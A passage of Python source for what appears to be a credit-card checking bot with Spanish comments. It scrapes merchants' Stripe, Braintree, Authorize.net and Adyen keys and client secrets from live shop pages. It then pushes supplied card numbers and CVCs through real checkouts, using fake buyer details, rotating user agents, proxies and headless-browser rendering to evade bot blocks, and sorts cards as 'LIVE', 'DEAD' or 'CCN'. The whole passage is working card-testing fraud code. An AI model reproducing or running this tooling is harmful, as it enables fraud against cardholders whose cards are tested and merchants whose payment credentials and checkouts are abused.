    if (m) { clientSecret = m[0]; }
    const a = html.match(/acct_[A-Za-z0-9]+/);
    if (a) stripeAccount = a[0];
  }

  return { data: JSON.stringify({ clientSecret, stripeAccount }), type: 'application/json' };
};
"""
        api_url = f"{_browserless_endpoint().rstrip('/')}/function"
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(
                    api_url, params={"token": token},
                    json={"code": bl_code, "context": {
                        "cartUrl": base_url,
                        "variantId": variant["variant_id"],
                        "checkoutUrl": checkout_url,
                    }},
                    timeout=aiohttp.ClientTimeout(total=60),
                ) as resp:
                    if resp.status == 200:
                        raw = await resp.json()
                        inner = raw.get("data", "{}")
                        if isinstance(inner, str):
                            inner = json.loads(inner)
                        secret = inner.get("clientSecret")
                        acct = inner.get("stripeAccount")
                        if acct and not self.gate_config.get("stripe_account"):
                            self.gate_config["stripe_account"] = acct
                        return secret or None
        except Exception as exc:
            logger.warning("Error Browserless client_secret: %s", exc)
        return None

    def _get_bin_info(self, card_number: str) -> Dict[str, str]:
        for length in (8, 7, 6, 4):
            prefix = card_number[:length]
            if prefix in self._bin_database:
                return self._bin_database[prefix]
        first = card_number[0] if card_number else "4"
        brand = "MASTERCARD" if first == "5" else "VISA" if first == "4" else "AMEX" if first == "3" else "UNKNOWN"
        return {"brand": brand, "type": "CREDIT", "level": "STANDARD", "bank": "N/A", "phone": "", "country": "N/A"}

    def _validate_card_number(self, card_number: str) -> bool:
        digits = re.sub(r"\D", "", card_number)
        if not (13 <= len(digits) <= 19):
            return False
        total, is_second = 0, False
        for ch in reversed(digits):
            n = int(ch)
            if is_second:
                n *= 2
                if n > 9:
                    n -= 9
            total += n
            is_second = not is_second
        return total % 10 == 0

    def _detect_country(self, url: str, content: str = "") -> str:
        url_lower = url.lower()
        content_lower = content.lower()
        tld_map = {".ca": "CA", ".com.ca": "CA", ".us": "US", ".uk": "GB",
                   ".co.uk": "GB", ".au": "AU", ".com.au": "AU", ".mx": "MX", ".com.mx": "MX"}
        for tld, country in tld_map.items():
            if tld in url_lower:
                return country
        currency_map = {"CAD": "CA", "GBP": "GB", "£": "GB", "AUD": "AU", "MXN": "MX"}
        for cur, country in currency_map.items():
            if cur.lower() in content_lower or cur in content:
                return country
        return "US"

    def _generate_user_data(self, country: str) -> Dict[str, Any]:
        cd = COUNTRY_DATA.get(country, GENERIC_DATA)
        first = random.choice(cd["names"])
        last = random.choice(cd["last_names"])
        city = random.choice(list(cd["cities"].keys()))
        postal = random.choice(cd["cities"][city])
        street = random.choice(cd["streets"])
        fmt = random.choice(cd["address_formats"])
        try:
            address = fmt.format(number=random.randint(1, 9999), street=street,
                                 unit=random.randint(1, 999), apt=random.randint(1, 999),
                                 flat=random.randint(1, 99))
        except KeyError:
            address = f"{random.randint(1, 999)} {street}"
        phone_fmt = {
            "CA": f"+1{random.randint(2000000000, 9999999999)}",
            "US": f"+1{random.randint(2000000000, 9999999999)}",
            "GB": f"+44{random.randint(2000000000, 9999999999)}",
        }
        return {
            "name": f"{first} {last}", "first_name": first, "last_name": last,
            "email": f"{first.lower()}.{last.lower()}{random.randint(100,999)}@gmail.com",
            "phone": phone_fmt.get(country, phone_fmt["US"]),
            "address": address, "city": city, "postal_code": postal,
            "country": country, "currency": cd.get("currency", "USD"),
        }

    def _detect_processor(self, content: str) -> str:
        content_lower = content.lower()
        processor_keywords = {
            "STRIPE": ["stripe.js", "stripe.com", "js.stripe.com", "stripe-elements", "pk_live_", "pk_test_"],
            "PAYPAL": ["paypal.com", "paypal-js", "paypalobjects.com"],
            "ADYEN": ["adyen.com", "adyen.js", "adyen-checkout", "adyencheckout", "@adyen/", "checkoutshopper", "adyen-web"],
            "AUTHORIZE.NET": ["authorize.net", "authorizenet", "accept.js", "js.authorize.net", "acceptjs"],
            "BRAINTREE": ["braintreegateway.com", "braintree.js", "braintree-web", "client.braintree", "braintree-sdk", "wc_braintree"],
            "SHOPIFY_PAYMENTS": ["shopify_pay", "shopify-payments"],
            "KLARNA": ["klarna.com", "klarna.js"],
            "AFTERPAY": ["afterpay.com", "afterpay.js"],
            "SQUARE": ["squareup.com", "square.js"],
        }
        soup = BeautifulSoup(content, "html.parser")
        for script in soup.find_all("script", src=True):
            src = script["src"].lower()
            for processor, kws in processor_keywords.items():
                if any(kw in src for kw in kws):
                    return processor
        for processor, kws in processor_keywords.items():
            if any(kw in content_lower for kw in kws):
                return processor
        return "UNKNOWN"

    def _extract_stripe_keys(self, text: str) -> List[str]:
        keys: List[str] = []
        for pattern, _ in self._STRIPE_PATTERNS:
            if "pk_" in pattern:
                keys.extend(re.findall(pattern, text))
        return list(dict.fromkeys(keys))  # dedup preserving order

    def _extract_client_secret(self, text: str) -> str | None:
        """Extrae client_secret de PaymentIntent (pi_..._secret_...) del HTML."""
        m = re.search(r'(pi_[A-Za-z0-9]+_secret_[A-Za-z0-9]+)', text)
        return m.group(1) if m else None

    def _extract_stripe_account(self, text: str) -> str | None:
        m = re.search(r'(acct_[A-Za-z0-9]+)', text)
        return m.group(1) if m else None

    async def _validate_via_payment_intent(
        self, pk: str, client_secret: str, card_number: str,
        exp_month: str, exp_year: str, cvc: str,
        stripe_account: str = "", pm_id: str = ""
    ) -> Dict[str, Any] | None:
        """
        Flujo PaymentIntents: crea PaymentMethod (o reutiliza pm_id) → confirma PI.
        No requiere browser. Da respuesta bancaria real.
        """
        proxy = _proxy_url()
        start = time.time()
        origin = ""
        if self.current_gate:
            p = urlparse(self.current_gate)
            origin = f"{p.scheme}://{p.netloc}"

        base_headers = {
            "Authorization": f"Bearer {pk}",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": self.ua_manager.get_random(),
            "Origin": origin or "https://js.stripe.com",
            "Referer": self.current_gate or "https://js.stripe.com/",
        }
        if stripe_account:
            base_headers["Stripe-Account"] = stripe_account

        kw: Dict[str, Any] = {"timeout": aiohttp.ClientTimeout(total=20)}
        if proxy:
            kw["proxy"] = proxy

        try:
            async with aiohttp.ClientSession(headers=base_headers) as sess:
                # 1. Crear PaymentMethod si no tenemos uno ya
                if not pm_id:
                    pm_data = aiohttp.FormData()
                    pm_data.add_field("type", "card")
                    pm_data.add_field("card[number]", card_number)
                    pm_data.add_field("card[exp_month]", str(exp_month))
                    pm_data.add_field("card[exp_year]", str(exp_year))
                    pm_data.add_field("card[cvc]", cvc)
                    pm_data.add_field("payment_user_agent", "stripe.js/acacia; stripe-js-v3/acacia")
                    pm_data.add_field("referrer", self.current_gate or origin or "")

                    async with sess.post("https://api.stripe.com/v1/payment_methods",
                                         data=pm_data, **kw) as resp:
                        pm_resp = await resp.json()

                    if "error" in pm_resp:
                        err = pm_resp["error"]
                        code = err.get("code", "")
                        msg = err.get("message", "Declined")
                        if code == "incorrect_cvc":
                            return {"status": "CCN AUTH", "message": msg, "stripe_code": code,
                                    "validation_time": round(time.time() - start, 2), "via_browserless": False, "card_details": {}}
                        if code in ("card_declined",):
                            dc = err.get("decline_code", "")
                            st = "LIVE AUTH" if dc in ("insufficient_funds", "insufficient_balance") else "DEAD AUTH"
                            return {"status": st, "message": msg, "stripe_code": code,
                                    "validation_time": round(time.time() - start, 2), "via_browserless": False, "card_details": {}}
                        if code in ("expired_card", "invalid_number", "incorrect_number"):
                            return {"status": "DEAD AUTH", "message": msg, "stripe_code": code,
                                    "validation_time": round(time.time() - start, 2), "via_browserless": False, "card_details": {}}
                        return None  # error inesperado — fallback

                    pm_id = pm_resp.get("id", "")
                    if not pm_id:
                        return None

                # 2. Confirmar PaymentIntent
                pi_id = client_secret.split("_secret_")[0]
                conf_data = aiohttp.FormData()
                conf_data.add_field("payment_method", pm_id)
                conf_data.add_field("client_secret", client_secret)
                conf_data.add_field("return_url", origin + "/checkout" if origin else "https://example.com/")

                async with sess.post(
                    f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm",
                    data=conf_data, **kw
                ) as resp2:
                    pi_resp = await resp2.json()

            elapsed = round(time.time() - start, 2)
            status_stripe = pi_resp.get("status", "")
            card_det: Dict[str, Any] = {}
            pm_card = (pi_resp.get("payment_method") or {})
            if isinstance(pm_card, dict):
                c = pm_card.get("card", {})
                card_det = {"brand": c.get("brand", ""), "last4": c.get("last4", "****"),
                            "funding": c.get("funding", ""), "country": c.get("country", "")}

            if status_stripe == "succeeded":
                return {"status": "LIVE AUTH", "message": "PaymentIntent succeeded",
                        "stripe_code": "", "validation_time": elapsed,
                        "via_browserless": False, "token_id": pi_id, "card_details": card_det}

            if status_stripe in ("requires_action", "requires_source_action"):
                return {"status": "LIVE AUTH", "message": "3DS requerido (tarjeta válida)",
                        "stripe_code": "requires_action", "validation_time": elapsed,
                        "via_browserless": False, "token_id": pi_id, "card_details": card_det}

            if "last_payment_error" in pi_resp and pi_resp["last_payment_error"]:
                err = pi_resp["last_payment_error"]
                code = err.get("code", "")
                msg = err.get("message", "Declined")
                if code == "incorrect_cvc":
                    return {"status": "CCN AUTH", "message": msg, "stripe_code": code,
                            "validation_time": elapsed, "via_browserless": False, "card_details": card_det}
                if code == "card_declined":
                    dc = err.get("decline_code", "")
                    st2 = "LIVE AUTH" if dc in ("insufficient_funds", "insufficient_balance") else "DEAD AUTH"
                    return {"status": st2, "message": msg, "stripe_code": code,
                            "validation_time": elapsed, "via_browserless": False, "card_details": card_det}
                return {"status": "DEAD AUTH", "message": msg, "stripe_code": code,
                        "validation_time": elapsed, "via_browserless": False, "card_details": card_det}

            if "error" in pi_resp:
                return None  # fallback a tokens

            return {"status": "DEAD AUTH", "message": f"PI status: {status_stripe}",
                    "stripe_code": status_stripe, "validation_time": elapsed,
                    "via_browserless": False, "card_details": card_det}

        except Exception as exc:
            logger.warning("Error PaymentIntent flow: %s", exc)
            return None

    def _extract_braintree_fingerprint(self, content: str) -> str | None:
        """Extrae authorizationFingerprint del HTML de la página (client token Braintree)."""
        # Primero buscar fingerprint directo
        direct = re.search(r'"authorizationFingerprint"\s*:\s*"([^"]+)"', content)
        if direct:
            return direct.group(1)
        # Buscar client token en base64 y decodificarlo
        for pat in [
            r'(?:wc_braintree_client_token|clientToken|client_token)["\s]*[=:]\s*["\']([A-Za-z0-9+/=]{40,})["\']',
            r'data-braintree-client-token=["\']([A-Za-z0-9+/=]+)["\']',
        ]:
            m = re.search(pat, content)
            if m:
                val = m.group(1)
                try:
                    padding = "=" * ((4 - len(val) % 4) % 4)
                    decoded = base64.b64decode(val + padding).decode("utf-8", errors="replace")
                    fp = re.search(r'"authorizationFingerprint"\s*:\s*"([^"]+)"', decoded)
                    if fp:
                        return fp.group(1)
                except Exception:
                    pass
        return None

    def _extract_authnet_credentials(self, content: str) -> Dict[str, str] | None:
        """Extrae clientKey y apiLoginID del HTML para Accept.js de Authorize.net."""
        client_key = None
        api_login = None
        for pat in [r'"clientKey"\s*:\s*"([^"]+)"', r"clientKey['\s]*:['\s]*['\"]([^'\"]+)['\"]",
                    r'data-client-key=["\']([^"\']+)["\']']:
            m = re.search(pat, content)
            if m:
                client_key = m.group(1)
                break
        for pat in [r'"apiLoginID"\s*:\s*"([^"]+)"', r"apiLoginID['\s]*:['\s]*['\"]([^'\"]+)['\"]",
                    r'"loginId"\s*:\s*"([^"]+)"', r'data-api-login-id=["\']([^"\']+)["\']']:
            m = re.search(pat, content)
            if m:
                api_login = m.group(1)
                break
        if client_key and api_login:
            return {"clientKey": client_key, "apiLoginID": api_login}
        return None

    def _extract_adyen_client_key(self, content: str) -> str | None:
        """Extrae clientKey/originKey de Adyen del HTML."""
        for pat in [r'"clientKey"\s*:\s*"(test_[A-Za-z0-9]+|live_[A-Za-z0-9]+)"',
                    r'"originKey"\s*:\s*"([A-Za-z0-9_-]{20,})"',
                    r'clientKey["\s]*:["\s]*["\']([A-Za-z0-9_-]{20,})["\']']:
            m = re.search(pat, content)
            if m:
                return m.group(1)
        return None

    async def _validate_via_braintree_direct(
        self, card_number: str, exp_month: str, exp_year: str, cvc: str
    ) -> Dict[str, Any] | None:
        """Tokenización directa via Braintree GraphQL API."""
        if not self.current_gate:
            return None
        content = self.gate_config.get("raw_content", "")
        fingerprint = self._extract_braintree_fingerprint(content)
        if not fingerprint and _browserless_token():
            rendered = await _fetch_rendered_html(self.current_gate)
            if rendered:
                fingerprint = self._extract_braintree_fingerprint(rendered.decode("utf-8", errors="replace"))
        if not fingerprint:
            return None

        proxy = _proxy_url()
        start = time.time()
        mutation = """mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
  tokenizeCreditCard(input: $input) {
    token
    creditCard { bin last4 brand expirationMonth expirationYear }
  }
}"""
        payload = {
            "query": mutation,
            "variables": {
                "input": {
                    "creditCard": {
                        "number": card_number,
                        "expirationMonth": str(exp_month).zfill(2),
                        "expirationYear": str(exp_year),
                        "cvv": cvc,
                    }
                }
            },
        }
        headers = {
            "Authorization": f"Bearer {fingerprint}",
            "Braintree-Version": "2019-01-01",
            "Content-Type": "application/json",
            "User-Agent": self.ua_manager.get_random(),
        }
        try:
            kw: Dict[str, Any] = {"json": payload, "timeout": aiohttp.ClientTimeout(total=20)}
            if proxy:
                kw["proxy"] = proxy
            async with aiohttp.ClientSession(headers=headers) as sess:
                async with sess.post("https://payments.braintree-api.com/graphql", **kw) as resp:
                    data = await resp.json(content_type=None)
            elapsed = round(time.time() - start, 2)
            errors = data.get("errors", [])
            if errors:
                msg = errors[0].get("message", "Unknown error")
                ml = msg.lower()
                if any(k in ml for k in ("cvv", "security code", "cvc")):
                    return {"status": "CCN AUTH", "message": msg, "stripe_code": "braintree_cvv",
                            "validation_time": elapsed, "via_browserless": False, "card_details": {}}
                if "insufficient" in ml:
                    return {"status": "LIVE AUTH", "message": msg, "stripe_code": "braintree_funds",
                            "validation_time": elapsed, "via_browserless": False, "card_details": {}}
                return {"status": "DEAD AUTH", "message": msg, "stripe_code": "braintree_error",
                        "validation_time": elapsed, "via_browserless": False, "card_details": {}}
            token_data = data.get("data", {}).get("tokenizeCreditCard", {})
            cc = token_data.get("creditCard", {})
            return {
                "status": "LIVE AUTH",
                "message": "Braintree tokenization approved",
                "stripe_code": "",
                "validation_time": elapsed,
                "via_browserless": False,
                "token_id": token_data.get("token", ""),
                "card_details": {"brand": cc.get("brand", ""), "last4": cc.get("last4", "****"),
                                 "funding": "", "country": ""},
            }
        except Exception as exc:
            logger.warning("Error Braintree direct: %s", exc)
            return None

    async def _validate_via_authnet_direct(
        self, card_number: str, exp_month: str, exp_year: str, cvc: str
    ) -> Dict[str, Any] | None:
        """Tokenización directa via Accept.js de Authorize.net → submit a Shopify."""
        if not self.current_gate:
            return None
        content = self.gate_config.get("raw_content", "")
        creds = self._extract_authnet_credentials(content)
        if not creds and _browserless_token():
            rendered = await _fetch_rendered_html(self.current_gate)
            if rendered:
                creds = self._extract_authnet_credentials(rendered.decode("utf-8", errors="replace"))
        if not creds:
            return None

        proxy = _proxy_url()
        start = time.time()
        exp_date = f"{str(exp_month).zfill(2)}/{exp_year}"
        request_id = str(uuid.uuid4())
        user_data = self.gate_config.get("user_data") or self._generate_user_data("US")

        accept_payload = {
            "securePaymentContainerRequest": {
                "merchantAuthentication": {
                    "name": creds["apiLoginID"],
                    "clientKey": creds["clientKey"],
                },
                "data": {
                    "type": "TOKEN",
                    "id": request_id,
                    "token": {
                        "cardNumber": card_number,
                        "expirationDate": exp_date,
                        "cardCode": cvc,
                        "fullName": user_data.get("name", "John Smith"),
                    },
                },
            }
        }
        headers = {
            "Content-Type": "application/json",
            "User-Agent": self.ua_manager.get_random(),
            "Origin": self.current_gate,
            "Referer": self.current_gate,
        }
        try:
            kw: Dict[str, Any] = {"json": accept_payload, "timeout": aiohttp.ClientTimeout(total=15)}
            if proxy:
                kw["proxy"] = proxy
            async with aiohttp.ClientSession(headers=headers) as sess:
                async with sess.post("https://accept.authorize.net/api/payment/payment", **kw) as resp:
                    acc_data = await resp.json(content_type=None)
            elapsed = round(time.time() - start, 2)
            msgs = acc_data.get("messages", {})
            result_code = msgs.get("resultCode", "")
            msg_list = msgs.get("message", [])
            if result_code != "Ok" or not acc_data.get("opaqueData"):
                code = msg_list[0].get("code", "") if msg_list else ""
                text = msg_list[0].get("text", "Unknown") if msg_list else "Unknown"
                # Error codes: E_WC_05=invalid card, E_WC_06=invalid exp, E_WC_15=invalid CVV
                if code == "E_WC_15":
                    return {"status": "CCN AUTH", "message": text, "stripe_code": code,
                            "validation_time": elapsed, "via_browserless": False, "card_details": {}}
                return {"status": "DEAD AUTH", "message": text, "stripe_code": code,
                        "validation_time": elapsed, "via_browserless": False, "card_details": {}}
            # Tokenización exitosa — submit el opaqueData al checkout de Shopify via HTTP
            opaque = acc_data["opaqueData"]
            shopify_result = await self._submit_authnet_token_to_shopify(
                opaque["dataDescriptor"], opaque["dataValue"], user_data
            )
            if shopify_result:
                return {**shopify_result, "validation_time": round(time.time() - start, 2), "via_browserless": False}
            # Si no podemos completar en Shopify, token válido = card existe
            return {
                "status": "LIVE AUTH",
                "message": "Authorize.net token OK (card valid)",
                "stripe_code": "",
                "validation_time": elapsed,
                "via_browserless": False,
                "token_id": opaque.get("dataValue", "")[:24],
                "card_details": {},
            }
        except Exception as exc:
            logger.warning("Error Accept.js tokenization: %s", exc)
            return None

    async def _submit_authnet_token_to_shopify(
        self, data_descriptor: str, data_value: str, user_data: Dict[str, Any]
    ) -> Dict[str, Any] | None:
        """Envía opaqueData de Authorize.net al checkout de Shopify para obtener respuesta bancaria."""
        if not self.current_gate:
            return None
        parsed = urlparse(self.current_gate)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        variant = await self._get_cheapest_variant(base_url)
        if not variant:
            return None
        proxy = _proxy_url()
        kw: Dict[str, Any] = {"timeout": aiohttp.ClientTimeout(total=20), "allow_redirects": True}
        if proxy:
            kw["proxy"] = proxy
        headers = {
            "User-Agent": self.ua_manager.get_random(),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Content-Type": "application/x-www-form-urlencoded",
        }
        try:
            async with aiohttp.ClientSession(headers=headers) as sess:
                await sess.post(f"{base_url}/cart/add.js",
                                data={"id": str(variant["variant_id"])}, **kw)
                resp2 = await sess.post(f"{base_url}/checkout/", **kw)
                checkout_url = str(resp2.url)
                if "/checkouts/cn/" in checkout_url:
                    return None
                html3 = await resp2.text()
                country = self._country_from_checkout_html(html3)
                ud = self._generate_user_data(country)
                atoken = uuid.uuid4().hex * 2 + uuid.uuid4().hex[:22]
                payload2 = [
                    ("_method", "patch"), ("authenticity_token", atoken),
                    ("previous_step", "contact_information"), ("step", "shipping_method"),
                    ("checkout[email]", ud["email"]),
                    ("checkout[shipping_address][first_name]", ud["first_name"]),
                    ("checkout[shipping_address][last_name]", ud["last_name"]),
                    ("checkout[shipping_address][address1]", ud["address"]),
                    ("checkout[shipping_address][city]", ud["city"]),
                    ("checkout[shipping_address][country]", country),
                    ("checkout[shipping_address][zip]", ud["postal_code"]),
                    ("checkout[client_details][javascript_enabled]", "1"),
                ]
                await sess.post(checkout_url, data=payload2, **kw)
                ship_html = await (await sess.get(
                    checkout_url + "?previous_step=contact_information&step=shipping_method", **kw
                )).text()
                ship_soup = BeautifulSoup(ship_html, "html.parser")
                ship_div = ship_soup.find("div", {"class": "radio-wrapper"})
                price_send = ship_div["data-shipping-method"] if ship_div and ship_div.get("data-shipping-method") else "shopify-Standard Shipping-0.00"
                payload3 = {
                    "_method": "patch", "authenticity_token": atoken,
                    "previous_step": "shipping_method", "step": "payment_method",
                    "checkout[shipping_rate][id]": price_send,
                    "checkout[client_details][javascript_enabled]": "1",
                }
                await sess.post(checkout_url, data=payload3, **kw)
                pay_html = await (await sess.get(
                    checkout_url + "?previous_step=shipping_method&step=payment_method", **kw
                )).text()
                pay_soup = BeautifulSoup(pay_html, "html.parser")
                gateway_el = pay_soup.find("ul", {"role": "list"})
                idpay = gateway_el.get("data-brand-icons-for-gateway", "") if gateway_el else ""
                if not idpay:
                    return None
                price_span = pay_soup.find("span", {"class": lambda c: c and "total-recap__final-price" in c})
                price_final = price_span.get("data-checkout-payment-due-target", "") if price_span else ""
                payload5 = {
                    "_method": "patch", "authenticity_token": atoken,
                    "previous_step": "payment_method", "step": "",
                    "checkout[payment_gateway]": str(idpay),
                    "checkout[credit_card][vault]": "false",
                    "checkout[different_billing_address]": "false",
                    "checkout[total_price]": str(price_final),
                    "checkout[attributes][accept_js_data_descriptor]": data_descriptor,
                    "checkout[attributes][accept_js_data_value]": data_value,
                    "complete": "1",
                    "checkout[client_details][javascript_enabled]": "1",
                }
                resp7 = await sess.post(checkout_url, data=payload5, **kw)
                processing_url = str(resp7.url)
                try:
                    resp8 = await sess.get(processing_url + "?from_processing_page=1", **kw)
                    resp9 = await sess.get(str(resp8.url), **kw)
                    final_url = str(resp9.url)
                    final_html = await resp9.text()
                except Exception:
                    final_url = processing_url
                    final_html = ""
                notice_el = BeautifulSoup(final_html, "html.parser").find(
                    class_=lambda c: c and "notice__text" in c
                )
                notice_text = notice_el.get_text(strip=True) if notice_el else ""
                return self._interpret_shopify_response(final_url, notice_text)
        except Exception as exc:
            logger.warning("Error submit authnet token: %s", exc)
            return None

    async def _validate_via_adyen_direct(
        self, card_number: str, exp_month: str, exp_year: str, cvc: str
    ) -> Dict[str, Any]:
        """Valida tarjeta via Adyen con Browserless (intercepta respuesta Adyen API)."""
        start = time.time()
        if not self.current_gate:
            return {"status": "ERROR AUTH", "message": "No hay gate montado", "via_browserless": True, "card_details": {}}
        token = _browserless_token()
        if not token:
            return {"status": "ERROR AUTH", "message": "BROWSERLESS_TOKEN no configurado", "via_browserless": True, "card_details": {}}
        parsed = urlparse(self.current_gate)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        variant = await self._get_cheapest_variant(base_url)
        if not variant:
            return {"status": "ERROR AUTH", "message": "No hay producto disponible", "via_browserless": True, "card_details": {}}
        user_data = self.gate_config.get("user_data") or self._generate_user_data("US")
        api_url = f"{_browserless_endpoint().rstrip('/')}/function"
        payload = {
            "code": _BL_ADYEN_FUNCTION,
            "context": {
                "storeUrl": base_url,
                "variantId": variant["variant_id"],
                "card": {"number": card_number, "exp_month": exp_month, "exp_year": exp_year, "cvc": cvc},
                "userData": user_data,
            },
        }
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(
                    api_url, params={"token": token}, json=payload,
                    timeout=aiohttp.ClientTimeout(total=120),
                ) as resp:
                    if resp.status != 200:
                        return {"status": "ERROR AUTH", "message": f"Browserless {resp.status}", "via_browserless": True, "card_details": {}}
                    raw = await resp.json()
                    inner = raw.get("data", raw) if isinstance(raw, dict) else {}
            elapsed = round(time.time() - start, 2)
            return {
                "status": inner.get("status", "ERROR AUTH"),
                "message": inner.get("message", "Unknown"),
                "stripe_code": "",
                "validation_time": elapsed,
                "via_browserless": True,
                "card_details": {},
                "token_id": "",
            }
        except Exception as exc:
            logger.error("Error Adyen Browserless: %s", exc)
            return {"status": "ERROR AUTH", "message": str(exc), "via_browserless": True, "card_details": {}}

    def _session_headers(self, referer: str | None = None) -> Dict[str, str]:
        h = {
            "User-Agent": self.ua_manager.get_random(),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9,es;q=0.8",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
        }
        if referer:
            h["Referer"] = referer
        return h

    async def _analyze_shopify_page(self, url: str, progress_cb=None) -> Dict[str, Any]:
        """Analiza página Shopify. Usa Browserless si el checkout es JS-rendered."""

        async def _prog(step: int, total: int, label: str) -> None:
            if progress_cb:
                filled = round(step * 10 / total)
                bar = "█" * filled + "░" * (10 - filled)
                pct = round(step * 100 / total)
                try:
                    await progress_cb(f"[{bar}] {pct}%\n{label}")
                except Exception:
                    pass

        await _prog(1, 6, "🔗 Conectando a la tienda...")
        proxy = self.proxy_manager.get_proxy()
        timeout = aiohttp.ClientTimeout(total=20)
        start = time.time()

        analysis: Dict[str, Any] = {
            "url": url, "is_shopify": False, "shopify_indicators": [],
            "processor": "UNKNOWN", "public_keys": [],
            "load_time": 0, "content_length": 0, "page_title": "",
            "country": "US", "user_data": self._generate_user_data("US"),
            "prices_found": [], "form_elements": [], "browserless_used": False,
        }

        content = ""
        try:
            async with aiohttp.ClientSession(headers=self._session_headers()) as session:
                kwargs: Dict[str, Any] = {"allow_redirects": True, "timeout": timeout}
                if proxy:
                    kwargs["proxy"] = proxy
                async with session.get(url, **kwargs) as response:
                    content = await response.text()
                    analysis["load_time"] = round(time.time() - start, 2)
                    analysis["content_length"] = len(content)
                    self.request_stats["total_requests"] += 1
                    self.request_stats["successful_requests"] += 1
        except Exception as exc:
            self.request_stats["failed_requests"] += 1
            analysis["error"] = str(exc)

        # Si el HTML estático es sospechosamente pequeño (bot block / redirect vacío),
        # usar Browserless para obtener el HTML real antes de continuar el análisis.
        if len(content) < 500 and _browserless_token():
            await _prog(2, 6, "🌐 HTML bloqueado — render con Browserless...")
            rendered = await _fetch_rendered_html(url)
            if rendered:
                content = rendered.decode("utf-8", errors="replace")
                analysis["content_length"] = len(content)
                analysis["browserless_used"] = True
                analysis.pop("error", None)

        if not content:
            return analysis

        await _prog(2, 6, "📄 Analizando HTML estático...")
        soup = BeautifulSoup(content, "html.parser")
        title = soup.find("title")
        analysis["page_title"] = title.text.strip()[:100] if title else ""

        # Shopify indicators
        shopify_patterns = ["shopify", "myshopify.com", "cdn.shopify.com",
                            "shopify-assets", "shopify_pay", "shopify.js"]
        content_lower = content.lower()
        for pat in shopify_patterns:
            if pat in content_lower:
                analysis["is_shopify"] = True
                analysis["shopify_indicators"].append(pat)

        # Stripe pk_ + client_secret + stripe_account en static HTML
        analysis["public_keys"] = self._extract_stripe_keys(content)[:3]
        analysis["client_secret"] = self._extract_client_secret(content)
        analysis["stripe_account"] = self._extract_stripe_account(content)

        # Processor
        analysis["processor"] = self._detect_processor(content)

        # Prices
        prices: List[float] = []
        for pat in [r"\$\s*(\d+\.?\d*)", r"USD\s*(\d+\.?\d*)", r"CAD\s*(\d+\.?\d*)",
                    r"data-price=\"(\d+\.?\d*)\"", r"price:\s*(\d+\.?\d*)"]:
            for m in re.findall(pat, content, re.IGNORECASE):
                try:
                    v = float(m.replace(",", ""))
                    if 0.01 <= v <= 10000:
                        prices.append(v)
                except (ValueError, TypeError):
                    pass
        analysis["prices_found"] = sorted(set(prices))

        # Forms
        for form in soup.find_all("form"):
            inputs = [{"name": i.get("name", ""), "type": i.get("type", "text"),
                       "id": i.get("id", "")} for i in form.find_all("input") if i.get("name")]
            if inputs:
                analysis["form_elements"].append({
                    "action": form.get("action", ""),
                    "method": form.get("method", "GET").upper(),
                    "inputs": inputs,
                })

        analysis["country"] = self._detect_country(url, content)
        analysis["user_data"] = self._generate_user_data(analysis["country"])

        await _prog(3, 6, "🔎 Buscando scripts externos...")
        # Scripts externos del mismo dominio
        if not analysis["public_keys"]:
            base_domain = urlparse(url).netloc
            async with aiohttp.ClientSession(headers=self._session_headers(url)) as session:
                for tag in soup.find_all("script", src=True):
                    src = tag.get("src", "").strip()
                    if not src:
                        continue
                    full = urljoin(url, src)
                    parsed = urlparse(full)
                    if parsed.netloc not in (base_domain, "js.stripe.com", "checkout.stripe.com"):
                        if parsed.netloc != base_domain:
                            continue
                    try:
                        kwargs_js: Dict[str, Any] = {"timeout": aiohttp.ClientTimeout(total=8)}
                        if proxy:
                            kwargs_js["proxy"] = proxy
                        async with session.get(full, **kwargs_js) as r:
                            if r.status == 200:
                                js_text = await r.text(errors="replace")
                                keys = self._extract_stripe_keys(js_text)
                                analysis["public_keys"].extend(
                                    k for k in keys if k not in analysis["public_keys"]
                                )
                    except Exception:
                        pass
            analysis["public_keys"] = analysis["public_keys"][:3]

        await _prog(4, 6, "🌐 Render JS con Browserless..." if not analysis["public_keys"] and _browserless_token() else "🔍 Verificando...")
        # Browserless: render completo cuando no encontramos pk_ en HTML estático
        if not analysis["public_keys"] and _browserless_token():
            rendered = await _fetch_rendered_html(url)
            if rendered:
                rendered_text = rendered.decode("utf-8", errors="replace")
                keys = self._extract_stripe_keys(rendered_text)
                if keys:
                    analysis["public_keys"].extend(k for k in keys if k not in analysis["public_keys"])
                    analysis["browserless_used"] = True
                if not analysis.get("client_secret"):
                    analysis["client_secret"] = self._extract_client_secret(rendered_text)
                if not analysis.get("stripe_account"):
                    analysis["stripe_account"] = self._extract_stripe_account(rendered_text)
                # Re-check is_shopify in rendered HTML
                rendered_lower = rendered_text.lower()
                for pat in shopify_patterns:
                    if pat in rendered_lower and pat not in analysis["shopify_indicators"]:
                        analysis["is_shopify"] = True
                        analysis["shopify_indicators"].append(f"{pat} (JS-render)")
                # Re-detect processor
                if analysis["processor"] == "UNKNOWN":
                    analysis["processor"] = self._detect_processor(rendered_text)

        await _prog(6, 6, "✅ Análisis completado")
        analysis["raw_content"] = content[:50000]  # para extracción de acct_
        return analysis

    async def _get_cheapest_variant(self, base_url: str) -> Dict[str, Any] | None:
        """Obtiene el variant_id del producto más barato via /products.json."""
        proxy = _proxy_url() or self.proxy_manager.get_proxy()
        try:
            kwargs: Dict[str, Any] = {"timeout": aiohttp.ClientTimeout(total=10)}
            if proxy:
                kwargs["proxy"] = proxy
            async with aiohttp.ClientSession(headers=self._session_headers()) as session:
                async with session.get(f"{base_url.rstrip('/')}/products.json?limit=50", **kwargs) as resp:
                    if resp.status != 200:
                        return None
                    data = await resp.json(content_type=None)
                    cheapest: Dict[str, Any] | None = None
                    cheapest_price = float("inf")
                    for product in data.get("products", []):
                        for variant in product.get("variants", []):
                            try:
                                price = float(variant.get("price", 99999))
                            except (TypeError, ValueError):
                                continue
